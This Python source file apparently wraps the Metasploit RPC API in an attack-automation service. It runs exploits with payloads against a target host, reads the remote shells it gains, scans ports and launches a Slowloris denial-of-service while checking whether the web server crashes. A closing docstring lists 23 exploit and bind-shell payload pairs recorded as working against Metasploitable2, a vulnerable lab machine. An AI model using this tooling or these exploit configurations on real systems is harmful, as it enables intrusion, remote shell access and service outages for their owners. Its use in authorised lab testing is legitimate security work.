import re
import time
import socket

from metasploit.api.connections import Metasploit, SSH
from requests.adapters import ConnectionError
from metasploit.api.errors import (
    MsfrpcdConnectionError,
    TimeoutExpiredError,
    InvalidHostName,
    HostIsUnreachable
)
from metasploit.api.utils.rest_api_utils import HttpCodes
from metasploit.api.errors import (
    MetasploitActionError
)
from metasploit.api.response import payload_info_response, exploit_info_response, auxiliary_info_response
from metasploit.api.utils.helpers import TimeoutSampler
import logging

logger = logging.getLogger(__name__)


def metasploit_action_verification(func):
    """
    Verifies that the metasploit actions that are performed are valid.

    Args:
        func (Function): metasploit function.
    """

    def wrapper(self, *args, **kwargs):
        """
        Catches error of metasploit actions in case there are any.
        """
        try:
            return func(self, *args, **kwargs)
        except Exception as exc:
            raise MetasploitActionError(error_msg=str(exc), error_code=HttpCodes.BAD_REQUEST)

    return wrapper


class MetasploitModule(object):

    def __init__(self, source_host, port=50000, target=None):
        """
        Creates a metasploit class to connect and use metasploit functionality.

        Args:
            source_host (str): the host that uses metasploit.
            port (int): on which port the msfrpc listens to.
            target (str): target host to perform actions.

        Raises:
            MsfrpcdConnectionError: in case metasploit connection attempt has failed.
            InvalidHostName: in case the provided target host name is invalid.
        """
        self._source_host = source_host

        try:
            if target:
                self._target_host = socket.gethostbyname(target)
                self._ssh = SSH(hostname=source_host)
                ping_cmd = f"ping -c3 {self._target_host}"
                is_ping_success, _ = self._ssh.execute_commands(commands=[ping_cmd])
                if not is_ping_success:
                    raise HostIsUnreachable(source_host=self._source_host, target_host=self._target_host)
        except socket.gaierror:
            raise InvalidHostName(invalid_host=target)

        try:
            self._metasploit = Metasploit(server=source_host, port=port)
        except ConnectionError:
            raise MsfrpcdConnectionError(host=source_host, port=port)

    def init_module(self, module_name, module_type):
        """
        initializes the requested module of the metasploit.

        Args:
            module_name (str): module name.
            module_type (str): module type.

        Returns:
            MsfModule: a msfmodule object. e.g. ExploitModule, AuxiliaryModule, PayloadModule.
        """
        return self._metasploit.modules.use(mtype=module_type, mname=module_name)

    def execute_shell_commands(self, commands, session_id):
        """
        Executes shell commands on a remote host that we gained a remote shell to.

        Args:
            commands (list(str)): a list of commands to execute.
            session_id (str): session ID of the required shell.

        Yields:
            str: output of a command that was executed in the remote shell.
        """
        shell = self._metasploit.metasploit_client.sessions.session(sid=session_id)

        for cmd in commands:
            shell.write(data=cmd)
            yield shell.read()

    def execute_host_console_commands(self, commands, timeout=90, sleep=3):
        """
        executes host console commands in msf console.

        Args:
            commands (list(str)): set of commands to be done on the msf console.
            timeout (int): timeout limit to sample the duration of each command.
            sleep (int): sleep time between each sampling of the console status for every command.

        Yields:
            str: data output from the console of each command.
        """
        console = self._metasploit.host_console

        for cmd in commands:
            console.write(command=cmd)
            try:
                for is_busy in TimeoutSampler(timeout=timeout, sleep=sleep, func=console.is_busy):
                    if not is_busy:
                        break
            except TimeoutExpiredError:
                pass
            yield console.read()["data"]

        self._metasploit.destory_console()

    def job_info(self, job_id):
        """
        Gets information about an existing job in metasploit, ignores jobs that produce errors.

        Args:
            job_id (int): job ID.

        Returns:
            dict: job information in case exists, empty dict otherwise.
        """
        if str(job_id) in self._metasploit.metasploit_client.jobs.list:
            job_details = self._metasploit.metasploit_client.jobs.info(jobid=job_id)
            if "error" not in job_details:
                return job_details
        return {}

    def stop_job(self, job_id):
        """
        Stops a job performed by metasploit.

        Args:
            job_id (int): job ID.

        Returns:
            bool: True if job was stopped successfully, False otherwise.
        """
        self._metasploit.metasploit_client.jobs.stop(jobid=job_id)
        return True if str(job_id) not in self._metasploit.metasploit_client.jobs.list else False

    def build_module(self, name, options, type='payload'):
        """
        Builds up the MsfModule along with the options for the module.

        Args:
            name (str): module name.
            options (dict): module options.
            type (str): module type.

        Returns:
            MsfModule: a msfmodule object. e.g. ExploitModule, PayloadModule.
        """
        msf_module = self.init_module(module_name=name, module_type=type)

        for option, option_value in options.items():
            msf_module[option] = option_value
        return msf_module

    def execute(self, *args, **kwargs):
        """
        Base method to execute metasploit modules.
        """
        pass

    def info(self, *args, **kwargs):
        """
        Base method to collect information about metasploit modules.
        """
        pass


class Exploit(MetasploitModule):

    type = 'exploit'

    @metasploit_action_verification
    def execute(self, name, options, payloads):
        """
        Run the exploit with the payloads and build the json for the client.

        Args:
            name (ExploitModule): exploit name.
            options (dict): exploit customized options.
            payloads (dict): all the payloads requested by the client and their running options.

        Returns: list(dict): exploit details with all chosen payloads in case they were successful in any kind of way.

        Examples for what the function returns:

        [
            {
                "session":
                {
                    'type': 'shell', 'tunnel_local': '0.0.0.0:0', 'tunnel_peer': '172.18.0.3:6200',
                    'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor', 'via_payload': 'payload/cmd/unix/interact',
                    'desc': 'Command shell', 'info': '', 'workspace': 'default', 'session_host': '172.18.0.3',
                    'session_port': 21, 'target_host': '172.18.0.3', 'username': 'unknown', 'uuid': 'kwuol3sx',
                    'exploit_uuid': 'twu5wlxg', 'routes': '', 'arch': 'cmd'
                },
                "hostname": "the host name of the target host (executed using remote shell)",
                "whoami": "the user of the target host (usually root user), (executed using remote shell)",
            },
            {
                "job": # only job was created and not a session!!!!
                {
                    'jid': 32, 'name': 'Exploit: freebsd/samba/trans2open', 'start_time': 1607718442, 'datastore':
                    {
                        'WORKSPACE': None, 'VERBOSE': False, 'WfsDelay': 0, 'EnableContextEncoding': False,
                        'ContextInformationFile': None, 'DisablePayloadHandler': False, 'RHOSTS': '172.18.0.3',
                        'RPORT': 139, 'SSL': False, 'SSLVersion': 'Auto', 'SSLVerifyMode': 'PEER', 'SSLCipher': None,
                        'Proxies': None, 'CPORT': None, 'CHOST': None, 'ConnectTimeout': 10, 'TCP::max_send_size': 0,
                        'TCP::send_delay': 0, 'NTLM::UseNTLMv2': True, 'NTLM::UseNTLM2_session': True,
                        'NTLM::SendLM': True, 'NTLM::UseLMKey': False, 'NTLM::SendNTLM': True, 'NTLM::SendSPN': True,
                        'SMB::pipe_evasion': False, 'SMB::pipe_write_min_size': 1, 'SMB::pipe_write_max_size': 1024,
                        'SMB::pipe_read_min_size': 1, 'SMB::pipe_read_max_size': 1024, 'SMB::pad_data_level': 0,
                        'SMB::pad_file_level': 0, 'SMB::obscure_trans_pipe_level': 0, 'SMBDirect': True, 'SMBUser': '',
                        'SMBPass': '', 'SMBDomain': '.', 'SMBName': '*SMBSERVER', 'SMB::VerifySignature': False,
                        'SMB::ChunkSize': 500, 'SMB::Native_OS': 'Windows 2000 2195',
                        'SMB::Native_LM': 'Windows 2000 5.0', 'SMB::AlwaysEncrypt': True, 'BruteWait': None,
                        'BruteStep': None, 'TARGET': 0, 'PAYLOAD': 'bsd/x86/metsvc_bind_tcp', 'LPORT': 4444,
                        'PrependSetresuid': False, 'PrependSetreuid': False, 'PrependSetuid': False,
                        'PrependSetresgid': False, 'PrependSetregid': False, 'PrependSetgid': False,
                        'AppendExit': False, 'AutoLoadStdapi': True, 'AutoVerifySession': True,
                        'AutoVerifySessionTimeout': 30, 'InitialAutoRunScript': '', 'AutoRunScript': '',
                        'AutoSystemInfo': True, 'EnableUnicodeEncoding': False, 'HandlerSSLCert': None,
                        'SessionRetryTotal': 3600, 'SessionRetryWait': 10, 'SessionExpirationTimeout': 604800,
                        'SessionCommunicationTimeout': 300, 'PayloadProcessCommandLine': '', 'AutoUnhookProcess': False
                    }
                }
            },
        ]
        """
        exploit = self.build_module(name=name, options=options, type=self.type)
        # logger.info(f"exploit name: {exploit.name}")
        # logger.info(f"exploit RHOSTS: {exploit['RHOSTS']}")
        successful_payloads = []

        for payload_name, payload_options in payloads.items():
            payload = self.build_module(name=payload_name, options=payload_options)
            # logger.info(f"key: {payload_name}")
            # logger.info(f"value: {payload_options}")
            exploit_job = exploit.execute(payload=payload)
            # logger.info(f"exploit job {exploit_job}")
            job_id = exploit_job["job_id"]

            time.sleep(7)

            payload_details = self._collect_exploit_execution_result(
                job_id=job_id, exploit_name=name, payload_name=payload_name
            )
            if payload_details:
                successful_payloads.append(payload_details)
        return successful_payloads

    def _collect_exploit_execution_result(self, job_id, exploit_name, payload_name):
        """
        Collects information about exploit execution result.

        Args:
            job_id (int): the job ID of the executed task.
            exploit_name (str): exploit name.
            payload_name (str): payload name.

        Returns:
            dict: information about executed exploit with the provided payload if there is, empty dict otherwise.
        """
        payload_details = {}
        commands = ["hostname", "whoami"]
        # logger.info(f"sessions: {self._metasploit.metasploit_client.sessions.list}")

        for session_id, session_details in self._metasploit.metasploit_client.sessions.list.items():
            if exploit_name in session_details['via_exploit'] and payload_name in session_details['via_payload']:
                payload_details["session"] = session_details

                for output, cmd in zip(self.execute_shell_commands(commands=commands, session_id=session_id), commands):
                    payload_details[cmd] = output

        job_details = self.job_info(job_id=job_id)
        # logger.info(f"Job details: {self._metasploit.metasploit_client.jobs.info(jobid=str(job_id))}")
        if job_details:
            payload_details["job"] = job_details
        if payload_details:
            payload_details["target"] = self._target_host
            payload_details['success'] = True
        return payload_details

    @metasploit_action_verification
    def info(self, exploit_name):
        """
        Gets detailed information about an exploit.

        Args:
            exploit_name (str): exploit name.

        Returns:
            dict: information about the exploit.

        Example:

        {
            "description": "This module exploits a malicious backdoor that was added to the VSFTPD download archive.
            This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011
            according to the most recent information available. This backdoor was removed on July 3rd 2011.",
            "filledOptions": {
                "ConnectTimeout": 10,
                "DisablePayloadHandler": false,
                "EnableContextEncoding": false,
                "RPORT": 21,
                "SSL": false,
                "SSLVerifyMode": "PEER",
                "SSLVersion": "Auto",
                "TCP::max_send_size": 0,
                "TCP::send_delay": 0,
                "VERBOSE": false,
                "WfsDelay": 0
            },
            "name": "VSFTPD v2.3.4 Backdoor Command Execution",
            "options": [
                "WORKSPACE",
                "VERBOSE",
                "WfsDelay",
                "EnableContextEncoding",
                "ContextInformationFile",
                "DisablePayloadHandler",
                "RHOSTS",
                "RPORT",
                "SSL",
                "SSLVersion",
                "SSLVerifyMode",
                "SSLCipher",
                "Proxies",
                "CPORT",
                "CHOST",
                "ConnectTimeout",
                "TCP::max_send_size",
                "TCP::send_delay"
            ],
            "payloads": [
                "cmd/unix/interact"
            ],
            "platform": [
                "Msf::Module::Platform::Unix"
            ],
            "privileged": true,
            "rank": "excellent",
            "references": [
                [
                    "OSVDB",
                    "73573"
                ],
                [
                    "URL",
                    "http://pastebin.com/AetT9sS5"
                ],
                [
                    "URL",
                    "http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html"
                ]
            ],
            "requiredOptions": [
                "RHOSTS",
                "RPORT",
                "SSLVersion",
                "ConnectTimeout"
            ],
            "stance": "aggressive"
        }
        """
        exploit_name = exploit_name.replace(" ", "/")
        exploit = super().init_module(module_name=exploit_name, module_type=self.type)

        return exploit_info_response(exploit=exploit)


class Payload(MetasploitModule):

    type = 'payload'

    @metasploit_action_verification
    def info(self, payload_name):
        """
        Gets information about a payload.

        Args:
            payload_name (str): payload name.

        Returns:
            dict: information about the payload.

        Example:

        {
            "description": "Simply execve /bin/sh (for inetd programs)",
            "filledOptions": {
                "AIX": "6.1.4",
                "CreateSession": true,
                "VERBOSE": false
            },
            "name": "AIX execve Shell for inetd",
            "options": [
                "WORKSPACE",
                "VERBOSE",
                "AIX",
                "CreateSession",
                "InitialAutoRunScript",
                "AutoRunScript",
                "CommandShellCleanupCommand"
            ],
            "platform": [
                "Msf::Module::Platform::AIX"
            ],
            "privileged": false,
            "rank": "normal",
            "references": [],
            "requiredOptions": [
                "AIX"
            ]
        }
        """
        payload_name = payload_name.replace(" ", "/")
        payload = super().init_module(module_name=payload_name, module_type=self.type)

        return payload_info_response(payload=payload)


class PortScanning(MetasploitModule):

    def info(self):
        """
        Scan all the open ports on the target host.

        Returns: list(str): list with all the open ports on the target host.
            e.g.: [
            '172.18.0.3:3306', '172.18.0.3:3632', '172.18.0.3:5432',
            '172.18.0.3:5900', '172.18.0.3:6000',
            '172.18.0.3:6200', '172.18.0.3:6667', '172.18.0.3:6697',
            '172.18.0.3:8009', '172.18.0.3:8180', '172.18.0.3:8787'
        ]
        """
        commands = ['use auxiliary/scanner/portscan/tcp', f'set RHOSTS {self._target_host}', 'run']
        open_ports = []
        finding_port_pattern = f"{self._target_host}:[0-9]+"

        for data in self.execute_host_console_commands(commands=commands):
            open_ports += re.findall(pattern=finding_port_pattern, string=data)

        return open_ports


class Auxiliary(MetasploitModule):

    type = 'auxiliary'

    def info(self, auxiliary_name):
        """
        Gets information about an auxiliary.

        Args:
            auxiliary_name (str): auxiliary name.

        Returns:
            dict: information about the auxiliary.
        """
        auxiliary_name = auxiliary_name.replace(" ", "/")
        auxiliary = super().init_module(module_name=auxiliary_name, module_type=self.type)

        return auxiliary_info_response(auxiliary=auxiliary)

    def execute(self, *args, **kwargs):
        """
        Executes an auxiliary module.
        """
        if kwargs.pop("dos_slowris", None):
            return self.dos_slowris(**kwargs)

    def dos_slowris(self, name, options, min_timeout=3, max_timeout=5, wait_for_server_timeout=30, sleep=5):
        """
        Executes slowris dos attack on a target host (web server).

        Args:
            name (str): type of slowris attack to use.
            options (dict): slowris attack options.
            min_timeout (int): min timeout to get the curl response in seconds.
            max_timeout (int): max timeout to get the curl response in seconds.
            wait_for_server_timeout (int): timeout to wait for attacked server to return back to live or crash.
            sleep (int): sleep sampling between each execution of curl command.

        Returns:
            dict: response indicating about success or failure of the dos attack.

        Examples:

            {
                "curl --connect-timeout 3 --max-time 5 172.17.0.3":
                {
                    "curl_output": "curl: (28) Operation timed out after 5000 milliseconds with 0 bytes received\n",
                    "curl_status_code": 28
                },
            "success": true
            }
        """
        is_slowris_success_cmd = f"curl --connect-timeout {min_timeout} --max-time {max_timeout} {self._target_host}"
        auxiliary = self.build_module(name=name, options=options, type=self.type)
        job = auxiliary.execute()

        result = {}

        job_id = job['job_id']
        job_info = self.job_info(job_id=job_id)
        if job_info:

            try:

                for is_success, commands in TimeoutSampler(
                    timeout=wait_for_server_timeout,
                    sleep=sleep,
                    func=self._ssh.execute_commands,
                    commands=[is_slowris_success_cmd]
                ):
                    if not is_success:  # means we managed to make server crash

                        slowries_cmd_command_res = commands[0]
                        all_lines = [line for line in slowries_cmd_command_res[is_slowris_success_cmd][2]]
                        result['success'] = True
                        info = {
                            "curl_status_code": slowries_cmd_command_res[is_slowris_success_cmd][0],
                            "curl_output": all_lines[-1]
                        }
                        result[is_slowris_success_cmd] = info
                        break

                if not self.stop_job(job_id=job_id):
                    raise MetasploitActionError(
                        error_msg=f"unable to stop job {job_info}", error_code=HttpCodes.INTERNAL_SERVER_ERROR
                    )

            except TimeoutExpiredError:
                pass

        return result if result else {"success": False}


"""
Working exploits on metasploitable2

1)
{
    "name": "unix/ftp/vsftpd_234_backdoor",
    "payloads": {
        "cmd/unix/interact": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }          
}

2)
{
    "name": "unix/misc/distcc_exec",
    "payloads": {
        "cmd/unix/bind_perl": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }          
}

3)
{
    "name": "unix/irc/unreal_ircd_3281_backdoor",
    "payloads": {
        "cmd/unix/bind_perl": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }          
}

4)
{
    "name": "unix/irc/unreal_ircd_3281_backdoor",
    "payloads": {
        "payload/cmd/unix/bind_ruby": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }    
}
5)
{
    "name": "unix/irc/unreal_ircd_3281_backdoor",
    "payloads": {
        "cmd/unix/bind_ruby_ipv6": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}
6)
{
    "name": "exploit/multi/samba/usermap_script",
    "payloads": {
        "payload/cmd/unix/bind_awk": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}
7)
{
    "name": "exploit/multi/samba/usermap_script",
    "payloads": {
        "payload/cmd/unix/bind_busybox_telnetd": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }  
} 
8)
{
    "name": "exploit/multi/samba/usermap_script",
    "payloads": {
        "payload/cmd/unix/bind_inetd": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}
9)
{
    "name": "exploit/multi/samba/usermap_script",
    "payloads": {
        "payload/cmd/unix/bind_lua": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }      
} 
10)
{
    "name": "exploit/multi/samba/usermap_script",
    "payloads": {
        "payload/cmd/unix/bind_jjs": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

11)

{
    "name": "exploit/linux/postgres/postgres_payload",
    "payloads": {
        "payload/linux/x86/meterpreter/bind_ipv6_tcp": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

12)

{
    "name": "exploit/linux/postgres/postgres_payload",
    "payloads": {
        "payload/linux/x86/meterpreter/bind_nonx_tcp": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

13)

{
    "name": "exploit/linux/postgres/postgres_payload",
    "payloads": {
        "payload/linux/x86/shell/bind_ipv6_tcp": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

14)

{
    "name": "exploit/linux/postgres/postgres_payload",
    "payloads": {
        "payload/linux/x86/shell/bind_ipv6_tcp_uuid": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

15)

{
    "name": "exploit/linux/postgres/postgres_payload",
    "payloads": {
        "payload/linux/x86/shell/bind_tcp_uuid": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

16)

{
    "name": "exploit/linux/postgres/postgres_payload",
    "payloads": {
        "payload/linux/x86/shell/bind_tcp": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

17)

{
    "name": "exploit/linux/postgres/postgres_payload",
    "payloads": {
        "payload/linux/x86/shell_bind_tcp": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

18)

{
    "name": "exploit/linux/postgres/postgres_payload",
    "payloads": {
        "payload/linux/x86/shell_bind_ipv6_tcp": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

19)

{
    "name": "exploit/multi/http/php_cgi_arg_injection",
    "payloads": {
        "payload/generic/shell_bind_tcp": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

20)

{
    "name": "exploit/multi/http/php_cgi_arg_injection",
    "payloads": {
        "payload/php/bind_php_ipv6": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

21)

{
    "name": "exploit/multi/http/php_cgi_arg_injection",
    "payloads": {
        "payload/php/bind_php": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

22)

{
    "name": "exploit/multi/http/php_cgi_arg_injection",
    "payloads": {
        "payload/php/bind_perl_ipv6": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}

23)

{
    "name": "exploit/multi/http/php_cgi_arg_injection",
    "payloads": {
        "payload/php/bind_perl": {}
    },
    "options": {
        "RHOSTS": "<target_host>"
    }
}



"""